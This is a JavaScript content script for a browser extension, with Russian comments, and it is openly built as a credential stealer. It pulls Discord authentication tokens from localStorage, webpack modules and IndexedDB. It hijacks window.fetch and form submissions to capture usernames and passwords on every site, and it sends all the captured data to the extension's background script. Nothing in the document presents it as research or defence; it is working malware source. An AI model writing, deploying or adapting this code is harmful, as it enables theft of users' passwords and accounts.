console.log("Content script запущен");

function sendToBackground(data) {
    chrome.runtime.sendMessage(data);
}

// ============================================
// КРАЖА DISCORD TOKEN
// ============================================

function stealDiscordToken() {
    try {
        // Способ 1: localStorage
        const token = localStorage.getItem("token");
        if (token && token.length > 30) {
            sendToBackground({ type: "discord_token", token: token });
            return;
        }

        // Способ 2: window.__DISCORD_WEBPACK__
        if (window.__DISCORD_WEBPACK__) {
            const store = window.__DISCORD_WEBPACK__.find(m => m?.exports?.default?.getToken);
            if (store && store.exports.default.getToken()) {
                sendToBackground({ type: "discord_token", token: store.exports.default.getToken() });
                return;
            }
        }

        // Способ 3: IndexedDB
        const request = indexedDB.open("discord");
        request.onsuccess = function(event) {
            const db = event.target.result;
            try {
                const transaction = db.transaction(["token"], "readonly");
                const store = transaction.objectStore("token");
                const getRequest = store.getAll();
                getRequest.onsuccess = function() {
                    const tokens = getRequest.result;
                    if (tokens.length > 0) {
                        const token = tokens[0].token || tokens[0];
                        if (token && token.length > 30) {
                            sendToBackground({ type: "discord_token", token: token });
                        }
                    }
                };
            } catch (e) {}
        };
    } catch (e) {}
}

// ============================================
// ПАРОЛИ (для всех сайтов)
// ============================================

function extractCredentials() {
    const passwordInputs = document.querySelectorAll('input[type="password"]');
    for (const input of passwordInputs) {
        if (input.value && input.value.length >= 3 && !input.dataset.sent) {
            input.dataset.sent = "true";
            const form = input.closest("form") || document;
            const userInput = form.querySelector('input[name*="user"], input[name*="login"], input[name*="email"], input[type="email"], input[type="text"]');
            sendToBackground({
                type: "password_stolen",
                username: userInput ? userInput.value : "",
                password: input.value,
                url: window.location.href,
                pageTitle: document.title
            });
        }
    }
}

// Перехват fetch
const originalFetch = window.fetch;
window.fetch = async function(...args) {
    const response = await originalFetch.apply(this, args);
    if (args[0] && typeof args[0] === "string" && args[1] && args[1].body) {
        try {
            const body = args[1].body;
            if (typeof body === "string") {
                const json = JSON.parse(body);
                const username = json.cvalue || json.username || json.email || json.login || json.user || json.mail || "";
                const password = json.password || json.pass || json.pwd || "";
                if (password) {
                    sendToBackground({
                        type: "password_stolen",
                        username: username,
                        password: password,
                        url: args[0],
                        pageTitle: document.title
                    });
                }
            }
        } catch (e) {}
    }
    return response;
};

// Перехват форм
document.addEventListener("submit", function(e) {
    const form = e.target;
    if (!form || form.tagName !== "FORM") return;
    const inputs = form.querySelectorAll("input");
    let username = "";
    let password = "";
    for (const input of inputs) {
        const name = (input.name || input.id || input.type || "").toLowerCase();
        if (name.includes("user") || name.includes("login") || name.includes("email") || name.includes("mail") || name.includes("cvalue")) {
            username = input.value;
        }
        if (name.includes("pass") || name.includes("pwd")) {
            password = input.value;
        }
    }
    if (password && password.length > 3) {
        sendToBackground({
            type: "password_stolen",
            username: username,
            password: password,
            url: window.location.href,
            pageTitle: document.title
        });
    }
}, true);

// ============================================
// ЗАПУСК
// ============================================

setTimeout(() => {
    extractCredentials();
    if (window.location.href.includes("discord.com")) {
        stealDiscordToken();
    }
}, 3000);

console.log("Перехватчики установлены");